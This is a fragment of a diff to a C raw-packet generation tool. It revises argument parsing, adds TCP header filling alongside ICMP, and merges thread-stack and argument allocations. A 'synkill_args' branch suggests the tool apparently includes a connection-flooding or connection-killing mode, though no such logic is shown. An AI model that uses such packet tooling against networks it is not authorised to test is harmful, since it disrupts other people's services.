 		}else if(strcmp(argv[i],"--size")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			r0=sscanf(argv[++i],"%zu",&data_size);
 			if(r0<1)goto err_sarg;
 		}else if(strcmp(argv[i],"--sendbuf")==0||strcmp(argv[i],"--sndbuf")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			r0=sscanf(argv[++i],"%zu",&sndbuf);
 			if(r0<1)goto err_sarg;
 		}else if(strcmp(argv[i],"--data")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
 			data_from_file=argv[++i];
 		}else if(strcmp(argv[i],"--sleep")==0){
-			if(i==argc-1){
+			if(!argv[i+1]){
 				fprintf(stderr,"no argument after %s\n",argv[i]);
 				errexit("Failed\n");
 			}
@@ -1314,6 +1589,7 @@ err_sarg:
 			errexit("Failed\n");
 		}
 	}
+	if(argv==synkill_args)goto after_synkill_arg;
 //	if(epet==1)check_mode=CHECK_EPOLL;
 	//arg processing completed
 	pid=getpid();
@@ -1321,6 +1597,7 @@ err_sarg:
 	//signal(SIGABRT,psig);
 
 	if(do_alarm)alarm(do_alarm);
+
 	running=1;
 	if(recv_pack)read_packet(NULL);
 	if(check_mode==CHECK_NONE)check_mode=CHECK_NO;
@@ -1406,7 +1683,7 @@ err_sarg:
 			phdr[i]=process_icmphdr;
 			packlen+=sizeof(struct icmphdr);
 			++i;
-			ip_protocol=1;
+			ip_protocol=IPPROTO_ICMP;
 			proto=P_NONE;
 			break;
 		case P_UDP:
@@ -1439,26 +1716,44 @@ err_sarg:
 				break;
 			}
 			eth_protocol=ETH_P_IP;
-			proto=P_ICMP;
+			switch(upper_proto){
+//				case P_ICMP:
+//					proto=P_ICMP;
+//					break;
+//				case P_TCP:
+//					proto=P_TCP;
+//					break;
+				default:
+					proto=upper_proto;
+					break;
+			}
 			break;
-
+		case P_TCP:
+			fhdr[i]=fill_tcphdr;
+			phdr[i]=process_tcphdr;
+			packlen+=sizeof(struct tcphdr);
+			++i;
+			ip_protocol=IPPROTO_TCP;
+			proto=P_NONE;
+			break;
 		default:
 			errexit("unknown protocol\nFailed\n");
 	}
 }
 	phdr[i]=NULL;
 	fhdr[i]=NULL;
-	tstack=malloc(nthreads*TSTACK_SIZE);
+	tstack=malloc(nthreads*TSTACK_SIZE+nthreads*sizeof(*targ));
 	if(tstack==NULL){
 	perror("cannot malloc");
 	goto err0;
 	}
 //malloced
-	targ=malloc(nthreads*sizeof(*targ));
+	targ=(struct argandret *)((char *)tstack+nthreads*TSTACK_SIZE);
+/*	targ=malloc(nthreads*sizeof(*targ));
 	if(targ==NULL){
 	perror("cannot malloc");
 	goto err1;
-	}
+	}*/
 //malloced
 	if(data_from_file){
 		fd=open(data_from_file,O_RDONLY);
@@ -1574,15 +1869,15 @@ cannot_reseek:
 		else fprintf(stderr,"%ld errors occured\n",nerror_sum);
 	}
 	free(tstack);
-	free(targ);
+//	free(targ);
 	if(data_from_file!=NULL)free(data_from_file);
 	write(STDERR_FILENO,"Done\n",strlen("Done\n"));
 	return 0;
 err3:
 	if(data_from_file!=NULL)free(data_from_file);
 err2:
-	if(targ!=NULL)free(targ);
-err1:
+	//if(targ!=NULL)free(targ);
+//err1:
 	if(tstack!=NULL)free(tstack);
 err0:
 	errexit("Failed\n");
